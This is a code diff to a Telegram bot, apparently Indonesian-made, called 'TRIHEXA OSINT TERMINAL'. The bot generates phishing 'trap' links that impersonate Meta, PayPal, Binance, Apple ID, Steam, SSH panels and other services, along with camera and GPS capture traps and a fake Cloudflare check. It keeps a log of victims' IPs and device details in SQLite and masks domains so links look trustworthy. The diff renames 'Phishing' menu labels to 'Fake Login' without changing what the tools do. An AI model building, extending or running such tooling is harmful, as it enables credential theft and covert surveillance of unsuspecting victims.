@@ -7,11 +7,11 @@ import dns from "dns";
 import util from "util";
 import { Telegraf, Markup, Telegram } from "telegraf";
 import "dotenv/config";
-import net from "net";
+import db from './src/db/sqlite';
 import crypto from "crypto";
 import fs from "fs";
-import { templates } from "./trapTemplates";
 import { osintEngine } from "./src/services/osint";
+import osintRouter from "./src/api/osint";
 import rateLimit from "express-rate-limit";
 
 const TARGETS_FILE = "targets.json";
@@ -408,18 +408,10 @@ if (botInstance) {
   app.use('/api/', apiLimiter);
 
   // API routes
+  app.use('/api/osint', osintRouter);
+
   app.get("/api/health", (req, res) => {
     res.json({ status: "ok", botInitialized: !!botInstance });
-  });
-
-  app.get('/api/osint/analyze', async (req, res) => {
-    try {
-      const target = String(req.query.target || '');
-      const result = await osintEngine.analyzeTarget(target);
-      res.json(result);
-    } catch (e) {
-      res.status(500).json({ error: String(e) });
-    }
   });
 
   // Capture Bot User IP & Redirect
@@ -456,102 +448,7 @@ if (botInstance) {
     `);
   });
 
-  // OSINT API ENDPOINTS FOR FRONTEND UI
-  app.post('/api/osint/username', async (req, res) => {
-    const { username } = req.body;
-    if (!username) return res.status(400).json({ error: 'Username required' });
-    
-    // Platforms list (similar to bot command)
-    const platforms = [
-        { name: "GitHub", url: `https://github.com/${username}` },
-        { name: "Twitter", url: `https://twitter.com/${username}` },
-        { name: "Instagram", url: `https://www.instagram.com/${username}/` },
-        { name: "TikTok", url: `https://www.tiktok.com/@${username}` },
-        { name: "YouTube", url: `https://www.youtube.com/@${username}` },
-        { name: "Facebook", url: `https://www.facebook.com/${username}` },
-        { name: "Pinterest", url: `https://www.pinterest.com/${username}` },
-        { name: "Reddit", url: `https://www.reddit.com/user/${username}` },
-        { name: "Steam", url: `https://steamcommunity.com/id/${username}` },
-        { name: "GitLab", url: `https://gitlab.com/${username}` },
-        { name: "OnlyFans", url: `https://onlyfans.com/${username}` },
-        { name: "PornHub", url: `https://www.pornhub.com/users/${username}` },
-        { name: "Kaskus", url: `https://www.kaskus.co.id/profile/${username}` },
-        { name: "Kompasiana", url: `https://www.kompasiana.com/${username}` },
-        { name: "Blogger", url: `https://${username}.blogspot.com` },
-        { name: "WordPress", url: `https://${username}.wordpress.com` },
-        { name: "MobileLegends", url: `https://m.mobilelegends.com/en/search/user?keyword=${username}` },
-        { name: "Detik", url: `https://news.detik.com/search?query=${username}` },
-        { name: "Bukalapak", url: `https://www.bukalapak.com/u/${username}` },
-        { name: "Tokopedia", url: `https://www.tokopedia.com/people/${username}` },
-        { name: "Traveloka", url: `https://www.traveloka.com/en-id/user/${username}` },
-        { name: "Bstation", url: `https://www.bilibili.tv/en/space/${username}` },
-        { name: "Shopee", url: `https://shopee.co.id/${username}` }
-    ];
-
-    const results = await Promise.all(platforms.map(async (platform) => {
-        try {
-            const response = await fetchWithTimeout(platform.url, { 
-                method: 'GET',
-                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
-            }, 5000);
-            return {
-                name: platform.name,
-                url: platform.url,
-                found: response.status === 200,
-                status: response.status
-            };
-        } catch (e) {
-            return { name: platform.name, url: platform.url, found: false, status: 'TIMEOUT/ERROR' };
-        }
-    }));
-
-    res.json({ username, results });
-  });
-
-  app.get('/api/osint/ip', async (req, res) => {
-    const ip = req.query.query || req.query.ip || '';
-    try {
-        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,continent,country,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query`);
-        const data = await response.json();
-        res.json(data);
-    } catch (e) {
-        res.status(500).json({ status: 'fail', message: 'System timeout' });
-    }
-  });
-
-  app.get('/api/osint/whois', async (req, res) => {
-    const domain = String(req.query.domain || req.query.q || '').replace(/https?:\/\//, '').replace(/\/$/, '');
-    try {
-        const response = await fetch(`https://networkcalc.com/api/dns/whois/${domain}`);
-        const data = await response.json();
-        res.json(data);
-    } catch (e) {
-        res.status(500).json({ error: 'WHOIS lookup failed' });
-    }
-  });
-
-  app.get('/api/osint/dns', async (req, res) => {
-    const domain = String(req.query.domain || req.query.q || '').replace(/https?:\/\//, '').replace(/\/$/, '');
-    try {
-        const response = await fetch(`https://networkcalc.com/api/dns/lookup/${domain}`);
-        const data = await response.json();
-        res.json(data);
-    } catch (e) {
-        res.status(500).json({ error: 'DNS lookup failed' });
-    }
-  });
-
-  app.get('/api/osint/email', async (req, res) => {
-    const email = String(req.query.email || '');
-    if (!email.includes('@')) return res.status(400).json({ error: 'Invalid email' });
-    const domain = email.split("@")[1];
-    try {
-        const records = await resolveMx(domain);
-        res.json({ email, domain, validFormat: true, mxRecords: records });
-    } catch (e) {
-        res.status(500).json({ email, domain, validFormat: true, mxRecords: [], error: true, message: 'MX fetch failed' });
-    }
-  });
+  // OSINT API ENDPOINTS FOR FRONTEND UI Are handled by the /api/osint router
 
   app.get('/api/osint/nik', (req, res) => {
     const nik = String(req.query.nik || '');
@@ -658,14 +555,15 @@ if (botInstance) {
       const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
       const targetIp = String(ip).split(',')[0].trim();
       
-      targetsData.push({
-        id: id,
-        timestamp: new Date().toISOString(),
-        type: 'BASIC_HIT',
-        ip: targetIp,
-        ua: String(userAgent)
-      });
-      saveTargets();
+      try {
+        const stmt = db.prepare('INSERT INTO targets (id, name) VALUES (?, ?) ON CONFLICT(id) DO NOTHING');
+        stmt.run(id, targetIp);
+
+        const logStmt = db.prepare('INSERT INTO logs (target_id, type, data, ip, user_agent) VALUES (?, ?, ?, ?, ?)');
+        logStmt.run(id, 'BASIC_HIT', '{}', targetIp, String(userAgent));
+      } catch (dbErr) {
+        console.error("DB Error", dbErr);
+      }
 
       // Send telegram notification if it's not a bot
       if (!isSuspeciousAgent(userAgent)) {
@@ -952,15 +850,19 @@ if (botInstance) {
       })();
       
       // Save to Target DB
-      targetsData.push({
-        id: id,
-        timestamp: new Date().toISOString(),
-        type: 'ADVANCED_AUDIT',
-        platform: data.platform,
-        browser: data.vendor,
-        gpu: data.gpu
-      });
-      saveTargets();
+      try {
+        const stmt = db.prepare('INSERT INTO targets (id, name) VALUES (?, ?) ON CONFLICT(id) DO NOTHING');
+        stmt.run(id, id);
+
+        const logStmt = db.prepare('INSERT INTO logs (target_id, type, data) VALUES (?, ?, ?)');
+        logStmt.run(id, 'ADVANCED_AUDIT', JSON.stringify({
+            platform: data.platform,
+            browser: data.vendor,
+            gpu: data.gpu
+        }));
+      } catch (dbErr) {
+        console.error("DB Error", dbErr);
+      }
     } else {
       console.error(`[DEBUG] FAILED to send log: botInstance: ${!!botInstance}, chatId: ${chatId}`);
     }
@@ -1692,12 +1594,12 @@ There are no background services or permissions associated.
       ['🔎 WHOIS Domain', '🌍 DNS Records Lookup', '🕸️ Subdomain Scanner', '🕷️ Shodan Dorking'],
       ['📧 Email Validator & Leak', '👤 Sosmed & Username Tracker', '📞 Phone Tracker (HLR)'],
       ['💻 MAC Address OSINT', '🚀 Port Scanner', '🚨 CVE Exploit Lookup'],
-      ['── 🛑 STEALTH TRAP LOGGER ──'],
-      ['📸 Hack Kamera Target', '📍 Hack GPS Presisi Target'],
-      ['🎣 Phishing IG/Meta', '💬 Phishing FB/Messenger', '💼 Phishing LinkedIn'],
-      ['💰 Phishing Crypto/Wallet', '💳 Phishing PayPal', '🛒 Phishing Amazon/Toko'],
-      ['🎮 Phishing Steam', '🍎 Phishing AppleID', '🐧 Phishing Linux/SSH'],
-      ['🎵 Phishing Spotify/Netflix', '📁 Phishing GDrive/Dropbox', '🛡️ Trap Bypass Cloudflare'],
+      ['── 🛑 TRAP & LOGGER ──'],
+      ['📸 Request Camera Trap', '📍 Request GPS Trap'],
+      ['🎣 Fake Login IG/Meta', '💬 Fake Login FB/Messenger', '💼 Fake Login LinkedIn'],
+      ['💰 Fake Login Crypto/Wallet', '💳 Fake Login PayPal', '🛒 Fake Login Amazon/Toko'],
+      ['🎮 Fake Login Steam', '🍎 Fake Login AppleID', '🐧 Fake Login Linux/SSH'],
+      ['🎵 Fake Login Spotify/Netflix', '📁 Fake Login GDrive/Dropbox', '🛡️ Trap Bypass Cloudflare'],
       ['📊 Lihat Log Korban (Logger)', '⚙️ Set Custom Domain Tracker'],
       ['── 🛠️ ADVANCED CYBER TOOLS ──'],
       ['🔐 Hash Generator (MD5/SHA)', '🔓 Base64 Encode/Decode', '💳 Cek Info BIN Card'],
@@ -4547,7 +4449,7 @@ There are no background services or permissions associated.
        '🔒 TRIHEXA OSINT TERMINAL 🔒': '<b>🔒 TRIHEXA OSINT TERMINAL</b>\nSistem aktif. Pilih menu pada keyboard.',
        '── 🇮🇩 OSINT INDONESIA ──': '<b>🇮🇩 PUSAT KONTROL OSINT INDONESIA</b>\nPilih layanan pencarian data dari tombol di bawah.',
        '── 🕵️ GLOBAL OSINT & TRACKING ──': '<b>🕵️ GLOBAL OSINT & TRACKING</b>\nPilih layanan pelacakan digital dari tombol di bawah.',
-       '── 🛑 STEALTH TRAP LOGGER ──': '<b>🛑 STEALTH TRAP LOGGER</b>\nPilih modul eksploitasi & phishing dari tombol di bawah.',
+       '── 🛑 TRAP & LOGGER ──': '<b>🛑 TRAP LOGGER</b>\nPilih modul logging dari tombol di bawah.',
        '── 🛠️ ADVANCED CYBER TOOLS ──': '<b>🛠️ ADVANCED CYBER TOOLS</b>\nPilih alat siber tingkat lanjut dari tombol di bawah.',
        '── 🧩 UTILITAS & MEDIA ──': '<b>🧩 UTILITAS & MEDIA</b>\nPilih alat hiburan dan utilitas dari tombol di bawah.',
        '── 💀 PRO FITUR ──': '<b>💀 VIP & PRO FITUR</b>\nAkses layanan khusus dan eksperimental.',
@@ -4585,20 +4487,20 @@ There are no background services or permissions associated.
        '🚀 Port Scanner': '<b>🚀 PORT SCANNER</b>\nKetik:\n• <code>/port [IP/Domain]</code>',
        '🚨 CVE Exploit Lookup': '<b>🚨 CVE / RED TEAM ANALYST</b>\nKetik:\n• <code>/cve CVE-XXXX-XXXX [PAS 1928]</code>',
        
-       '📸 Hack Kamera Target': '<b>📸 INJEKSI KAMERA STEALTH</b>\nBuat Link: <code>/trap_camera</code>\n<i>(Kirim link unik ke target dan sistem akan memotret diam-diam jika disetujui)</i>',
-       '📍 Hack GPS Presisi Target': '<b>📍 INJEKSI LOKASI GPS (PRESISI TINGGI)</b>\nBuat Link: <code>/trap_gps</code>\n<i>(Sadap titik koordinat Live akurat target)</i>',
-       '🎣 Phishing IG/Meta': '<b>🎣 LOGIN PANEL PHISHING META</b>\nBuat Link: <code>/trap_ig</code>',
-       '💰 Phishing Crypto/Wallet': '<b>💰 PHISHING WALLET WEB3 / BINANCE</b>\nBuat Link: <code>/trap_binance</code>, <code>/trap_wallet</code>',
-       '💳 Phishing PayPal': '<b>💳 PHISHING PAYPAL</b>\nBuat Link: <code>/trap_paypal</code>',
-       '🎮 Phishing Steam': '<b>🎮 LOGIN PANEL STEAM</b>\nBuat Link: <code>/trap_steam</code>',
+       '📸 Request Camera Trap': '<b>📸 CAMERA TRAP</b>\nBuat Link: <code>/trap_camera</code>\n<i>(Kirim link unik ke target untuk meminta akses kamera)</i>',
+       '📍 Request GPS Trap': '<b>📍 LOCATION TRAP</b>\nBuat Link: <code>/trap_gps</code>\n<i>(Kirim link untuk meminta akses lokasi)</i>',
+       '🎣 Fake Login IG/Meta': '<b>🎣 FAKE LOGIN META</b>\nBuat Link: <code>/trap_ig</code>',
+       '💰 Fake Login Crypto/Wallet': '<b>💰 FAKE LOGIN WEB3 / BINANCE</b>\nBuat Link: <code>/trap_binance</code>, <code>/trap_wallet</code>',
+       '💳 Fake Login PayPal': '<b>💳 FAKE LOGIN PAYPAL</b>\nBuat Link: <code>/trap_paypal</code>',
+       '🎮 Fake Login Steam': '<b>🎮 FAKE LOGIN STEAM</b>\nBuat Link: <code>/trap_steam</code>',
        '🛡️ Trap Bypass Cloudflare': '<b>🛡️ FAKE CLOUDFLARE ANTI-BOT (TRAP)</b>\nBuat Link: <code>/trap_cloudflare</code>',
-       '💬 Phishing FB/Messenger': '<b>💬 PHISHING FB/MESSENGER</b>\nBuat Link: <code>/trap_facebook</code>, <code>/trap_messenger</code>',
-       '💼 Phishing LinkedIn': '<b>💼 PHISHING LINKEDIN</b>\nBuat Link: <code>/trap_linkedin</code>',
-       '🛒 Phishing Amazon/Toko': '<b>🛒 PHISHING AMAZON</b>\nBuat Link: <code>/trap_amazon</code>',
-       '🎵 Phishing Spotify/Netflix': '<b>🎵 PHISHING SPOTIFY/NETFLIX</b>\nBuat Link: <code>/trap_spotify</code>, <code>/trap_netflix</code>',
-       '🍎 Phishing AppleID': '<b>🍎 PHISHING APPLE ID</b>\nBuat Link: <code>/trap_apple</code>',
-       '📁 Phishing GDrive/Dropbox': '<b>📁 PHISHING GDRIVE/DROPBOX</b>\nBuat Link: <code>/trap_gdrive</code>, <code>/trap_dropbox</code>',
-       '🐧 Phishing Linux/SSH': '<b>🐧 PHISHING SSH/LINUX PANEL</b>\nBuat Link: <code>/trap_ssh</code>',
+       '💬 Fake Login FB/Messenger': '<b>💬 FAKE LOGIN FB/MESSENGER</b>\nBuat Link: <code>/trap_facebook</code>, <code>/trap_messenger</code>',
+       '💼 Fake Login LinkedIn': '<b>💼 FAKE LOGIN LINKEDIN</b>\nBuat Link: <code>/trap_linkedin</code>',
+       '🛒 Fake Login Amazon/Toko': '<b>🛒 FAKE LOGIN AMAZON</b>\nBuat Link: <code>/trap_amazon</code>',
+       '🎵 Fake Login Spotify/Netflix': '<b>🎵 FAKE LOGIN SPOTIFY/NETFLIX</b>\nBuat Link: <code>/trap_spotify</code>, <code>/trap_netflix</code>',
+       '🍎 Fake Login AppleID': '<b>🍎 FAKE LOGIN APPLE ID</b>\nBuat Link: <code>/trap_apple</code>',
+       '📁 Fake Login GDrive/Dropbox': '<b>📁 FAKE LOGIN GDRIVE/DROPBOX</b>\nBuat Link: <code>/trap_gdrive</code>, <code>/trap_dropbox</code>',
+       '🐧 Fake Login Linux/SSH': '<b>🐧 FAKE LOGIN SSH/LINUX</b>\nBuat Link: <code>/trap_ssh</code>',
        '📊 Lihat Log Korban (Logger)': '<b>📊 KONTROL PANEL STEALTH LOGGER</b>\nCek daftar IP target & Korban: <code>/logger</code>',
        '⚙️ Set Custom Domain Tracker': '<b>⚙️ ATUR DOMAIN UNTUK TRAP LOGGER</b>\nGunakan masking agar link tidak mencurigakan:\n<code>/sethost [Pilihan]</code>',
        
@@ -4705,9 +4607,13 @@ There are no background services or permissions associated.
           if (result.findings.length > 0) {
               txt += `🗂️ <b>CORRELATED FINDINGS:</b>\n`;
               result.findings.forEach(f => {
-                 let marker = f.confidence > 80 ? '🟢' : (f.confidence > 50 ? '🟡' : '🔴');
-                 txt += ` ${marker} <b>${f.platform.charAt(0).toUpperCase() + f.platform.slice(1)}</b> (${f.confidence}%)\n`;
-                 txt += `    └ <code>${f.data}</code>\n`;
+                 let marker = f.verified ? '🟢 (VERIFIED)' : (f.confidence > 50 ? '🟡' : '🔴');
+                 txt += ` ${marker} <b>${f.platform.charAt(0).toUpperCase() + f.platform.slice(1)}</b>\n`;
+                 // Since data might be an object now, strigify it beautifully
+                 const dataStr = typeof f.data === 'object' ? JSON.stringify(f.data).substring(0, 100) : String(f.data);
+                 txt += `    ├ Data: <code>${dataStr}</code>\n`;
+                 txt += `    ├ Evidence: <i>${f.evidence}</i>\n`;
+                 txt += `    └ Timestamp: <code>${f.timestamp}</code>\n`;
                  if (f.url) {
                     txt += `    └ <a href="${f.url}">Link Bukti</a>\n`;
                  }
